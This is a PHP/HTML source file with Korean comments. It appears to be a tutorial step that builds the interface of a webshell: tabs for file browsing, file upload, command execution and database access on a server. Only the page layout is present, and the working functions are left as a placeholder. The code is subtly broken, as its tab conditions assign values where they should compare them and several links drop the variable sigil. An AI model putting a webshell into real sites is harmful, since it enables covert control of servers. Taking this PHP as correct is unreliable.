<?
    header("Content-Type: text/html; charset=UTF-8");  // 인코딩 설정. 
    $mode = $_REQUEST["mode"];                         // $_REQUEST 변수 : 사용자 입력값을 받는 변수. GET, POST, COOKIE 모두 받는다.
    $page = basename($_SERVER["PHP_SELF"]);            // $_SERVER["PHP_SEL"] : 웹에서는 URL상의 경로가 출력됨. $_SERVER["PHP_SELF"]를 통해 현재 페이지의 URI를 page 변수에 저장.
                                                       // basename() 함수 : 주어진 경로에서 파일 이름만 반환하도록 하는 함수.
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <title>Crehacktive Webshell</title>
    <!-- 부트스트랩 CDN -->
    <!-- 합쳐지고 최소화된 최신 CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

    <!-- 부가적인 테마 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

    <!-- 합쳐지고 최소화된 최신 자바스크립트 -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
</head>
<body>
<div class="container-fluid">                                   <!-- 컨테이너. container-fluid - 전체폭까지 늘어나는 최대폭 컨테이너 -->
    <div class="row">                                  
    <div class="col-md-3"></div>                                <!-- 그리드. 3등분되는 그리드 -->
    <div class="col-md-6"></div>                                <!-- 웹쉘 UI가 출력되는 그리드 영역. -->
        <h3>Webshell<small>Create by Crehactive</small></h3>    <!-- 타이포그래피 - 제목 -->
        <hr>                                                    <!-- 수평선. -->
        <ul class="nav nav-tabs">                               <!-- 네비게이션 - 탭형 -->
        <li role="presentation" <? if(empty($mode) || $mode= "fileBrowser") echo "class=\"active\""?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>    
        <!-- active 의사 클래스(가상 클래스) : 사용자가 활성화한 요소(버튼 등). 즉, fileBrowser가 활성화 됨. -->
        <!-- 만약, mode가 비어있거나 또는 mode가 fileBrowser라면 fileBrowser를 활성화시키겠다. -->
        <li role="presentation" <? if($mode= "fileUpload") echo "class=\"active\""?>><a href="<?=page?>?mode=fileUpload">File Upload</a></li>
        <!-- 만약, mode가 fileUpload라면 fileUpload를 활성화시키겠다. -->
        <li role="presentation" <? if($mode= "command") echo "class=\"active\""?>><a href="<?=page?>?mode=command">Command Execution</a></li>
        <!-- 만약, mode가 command라면 command를 활성화시키겠다. -->
        <li role="presentation" <? if($mode= "db") echo "class=\"active\""?>><a href="<?=page?>?mode=db">DB Connector</a></li>
        <!-- 만약, mode가 db라면 db를 활성화시키겠다. -->
        <li role="presentation"><a href="<?=page?>?mode=logout">Logout</a></li>
        <!-- logout은 active 클래스 필요없다. 바로 로그아웃하면 되니. -->
        </ul>
        content
        <hr>                                                     <!-- 수평선. -->
        <p class="text-muted text-center">Copyright(c) 2021, Crehacktive, All rights reserved.</p>     <!-- 카피라이트 넣기. 회색으로 작성. 가운데 정렬. -->
    <div class="col-md-3"></div>
    </div>
</div>
</body>
</html>